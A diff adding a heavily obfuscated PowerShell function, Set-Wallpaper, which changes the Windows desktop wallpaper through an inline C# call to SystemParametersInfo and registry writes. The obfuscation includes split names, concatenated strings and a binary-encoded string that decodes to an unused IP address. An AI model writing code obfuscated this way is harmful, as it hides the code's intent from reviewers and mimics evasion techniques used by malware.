@@ -1,0 +1,109 @@
+  $0eo=[TYpE]('con'+'Vert');  SET-varI`A`B`le  ("Yt"+"43")  ([tyPE]('io.'+'Pa'+'Th') ) ;    S`ET-`VariA`BlE  ihox  (  [type]('W'+'AL'+'lp'+'aPer.SETtEr'))  ;
+
+
+
+
+
+
+
+
+
+
+
+
+function SEt-WalLPaPer {
+    param (
+        [string]${Pa`Th},
+        [ValidateSet(('Ti'+'le'), ('C'+'ent'+'er'), ('Stre'+'tch'), ('F'+'ill'), ('Fi'+'t'), ('Spa'+'n'))]
+        [string]${S`TyLE} = ('Fi'+'ll')
+    )
+    ${Qv`gk}=  ( -Join ('100111%1101001S1110000{111010>110110t110001>101110i110001~110010i110101~101110%110100}110010S101110S110101{110011%100111' -SplIT't'-sPlIT'S' -SpLiT '}'-spliT'%'-SPLit'>'-sPlIt 'i'-SPliT '{'-sPlIT'~' -spLIt'O'-sPLiT '<' | %{ (  ( G`Et`-`VAriable  0Eo -vALue  )::TOiNt16( ( [StrInG]${_} ) , 2 )-AS[CHAr])} ))
+
+    Beg`In {
+        aDd`-tY`pe @"
+        using System;
+        using System.Runtime.InteropServices;
+        using Microsoft.Win32;
+        namespace Wallpaper
+        {
+        public enum Style : int
+        {
+        Tile, Center, Stretch, Fill, Fit, Span, NoChange
+        }
+        public class Setter {
+        public const int SetDesktopWallpaper = 20;
+        public const int UpdateIniFile = 0x01;
+        public const int SendWinIniChange = 0x02;
+        [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
+        private static extern int SystemParametersInfo (int uAction, int uParam, string lpvParam, int fuWinIni);
+        public static void SetWallpaper ( string path, Wallpaper.Style style ) {
+        SystemParametersInfo( SetDesktopWallpaper, 0, path, UpdateIniFile | SendWinIniChange );
+        RegistryKey key = Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true);
+        switch( style )
+        {
+        case Style.Tile :
+        key.SetValue(@"WallpaperStyle", "0") ;
+        key.SetValue(@"TileWallpaper", "1") ;
+        break;
+        case Style.Center :
+        key.SetValue(@"WallpaperStyle", "0") ;
+        key.SetValue(@"TileWallpaper", "0") ;
+        break;
+        case Style.Stretch :
+        key.SetValue(@"WallpaperStyle", "2") ;
+        key.SetValue(@"TileWallpaper", "0") ;
+        break;
+        case Style.Fill :
+        key.SetValue(@"WallpaperStyle", "10") ;
+        key.SetValue(@"TileWallpaper", "0") ;
+        break;
+        case Style.Fit :
+        key.SetValue(@"WallpaperStyle", "6") ;
+        key.SetValue(@"TileWallpaper", "0") ;
+        break;
+        case Style.Span :
+        key.SetValue(@"WallpaperStyle", "22") ;
+        key.SetValue(@"TileWallpaper", "0") ;
+        break;
+        case Style.NoChange :
+        break;
+        }
+        key.Close();
+        }
+        }
+        }
+"@
+
+        ${sTY`leN`Um} = @{
+            TiLE = 0
+            CEnteR = 1
+            sTretch = 2
+            FIlL = 3
+            fit = 4
+            spAn = 5
+        }
+
+        function RESOLve-FUllpath {
+            [CmdletBinding()]
+            param (
+                [Parameter(MaNdatORy=${t`Rue})]
+                [string]
+                
+                ${P`AtH} = $(Throw ('N'+'o pat'+'h prov'+'ided'+'.'))
+            )
+    
+            if ( -not ( $yt43::ispAThROOTed(${p`ATH})) ) {
+                
+                ${P`AtH} = JOI`N`-pATh (Get-loc`A`Ti`on) ${p`ATH}
+            }
+             (gET-`VA`R`iAbLE  ("YT"+"43") ).vaLUe::GEtfuLlPATh(${pA`Th})
+        }
+    }
+
+    P`Roc`ESS {
+         $IHOX::sEtwALLpaPeR(${P`AtH}, ${St`yL`ENUm}[${S`TyLe}])
+         (  VARi`A`BlE IHOx -VALUe  )::sEtwAllpaPer(${Pa`Th}, ${St`YleN`UM}[${St`y`lE}])
+    }
+}
+
+
